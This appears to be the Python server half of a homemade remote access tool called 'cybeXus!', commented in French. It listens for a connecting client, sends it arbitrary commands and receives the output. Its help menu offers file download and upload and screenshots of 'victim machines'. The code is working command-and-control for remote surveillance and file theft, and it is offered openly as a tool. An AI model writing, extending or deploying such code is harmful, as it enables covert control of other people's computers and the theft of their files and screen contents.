 # SOCKETS RESEAU : SERVEUR
 #
 # socket
 #  bind (ip, port) 127.0.0.1 -> localhost
 #  listen
 #  accept -> socket /(ip, port)
 #  close
 

import os
import subprocess
import platform
import socket
import time, random
import io
import pyfiglet
from PIL import ImageGrab
from colorama import Fore, Style
import modules.system_info as mod_info 
import modules.art as animation


my_art = pyfiglet.figlet_format("cybeXus!", font="slant")
os.system("cls" if os.name == "nt" else "clear")
animation.pentester_effect(my_art)


HOST_IP = "" #ouvert a tous connexion

MAX_DATA_SIZE = 1024


while True:
    try:
        HOST_PORT = int(input("[+] PORT TO LISTEN >"))
    except Exception as value_error:
        print("Port Must in range (1-65000)")
    else:
        break

#fonction pour calculer le data envoyer
def socket_receive_all_data(socket_p, data_len):
    current_data_len = 0
    total_data = None 
    #print("socket_receive_all_data len: ", data_len)
    while current_data_len < data_len:
        chunk_len = data_len - current_data_len
        if chunk_len > MAX_DATA_SIZE:
            chunk_len = MAX_DATA_SIZE
        data = socket_p.recv(chunk_len)
        #print(" len:", len(data))
        if not data:
            return None
        if not total_data:
            total_data = data
        else:
            total_data += data
        current_data_len += len(data)
        #print(" total len:", current_data_len, "/", data_len)
    return total_data

#fonction qui gere l'envoie du commande et reception de donnee

def socket_send_command_and_receive_all_data(socket_p,command):
     
    if not command:
        return None
    socket_p.sendall(command.encode())

    header_data = socket_receive_all_data(socket_p, 13)
    longueur_data = int(header_data.decode())

    data_recue = socket_receive_all_data(socket_p, longueur_data)
    return data_recue

#creation du socket
s = socket.socket()

#cela permet d'utilise les connexion deja utilise
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST_IP, HOST_PORT))
s.listen()

print("=========[CONFIG]==========")
print("[HOST]: <<cyb3rG0r4d>>")
print("[PORT]:" + str(HOST_PORT))
print("===========================")
print(" ")
print(f"[*] Waiting connection ...")


connection_socket, client_address = s.accept()



print(f"{Fore.YELLOW}[*] New Client Connected Found ... {Style.RESET_ALL}")

print(f"[+] Client ip: {client_address[0]}:{client_address[1]}")


dl_filename = None

#recuperation de donnee et envoie des commandes
while True:  

    infos_data = socket_send_command_and_receive_all_data(connection_socket, "infos")  
    if not infos_data:
        break
    commande = input(infos_data.decode() + " > ")

    commande_split = commande.split(" ")


#commande de televersement
    if len(commande_split) == 2 and commande_split[0] == "ul":
        try:
            f = open(commande_split[1], "rb")
        except FileNotFoundError:
            reponse = " ".encode()
        else:
            reponse = f.read()
            f.close()
                
    if commande == "help":
        print("")
        print("")
        print("====================")
        print("  BASIC COMMAND  ")
        print("====================")
        print("ls /dir          -- Show directory or file  ")
        print("mkdir            -- Create Directory")
        print("rmdir            -- Delete Directory")
        print("Touch            -- Create File (On Linux) ")
        print("")
        print("")
        print("")
        print("")
        print("====================")
        print("  COMMANDS AVAILABLE")
        print("====================")
        print("dl                   -- Download file from client")
        print("capture <filename>   -- Take Screenshot of victim machines")
        print("ip                   -- Show Network Info (Windows Only ) Tip manually for Linux")
        print("")
        print("")  

    if commande == "client_info":
        print("IP ADDRESS : " + client_address[0] +":" + str(client_address[1]))

    if len(commande_split) == 2 and commande_split[0] == "dl":
        dl_filename = commande_split[1]
    elif len(commande_split) == 2 and commande_split[0] == "capture":
        dl_filename = commande_split[1] + ".png"

    if len(commande_split) == 2 and commande_split[0] == "ul":
        dl_filename = commande_split[1]



    data_recue = socket_send_command_and_receive_all_data(connection_socket, commande)

    
    if not data_recue:
        break
    
    if dl_filename:
        if len(data_recue) == 1 and data_recue == b" ":
            print("ERROR : FILE", dl_filename, "NOT FOUND")
        else:
            f = open(dl_filename, "wb")
            f.write(data_recue)
            f.close()
            print("FILE", dl_filename, "DOWNLOADED SUCCESS..")
        dl_filename = None

    else:
        print(data_recue.decode())


s.close()
connection_socket.close()
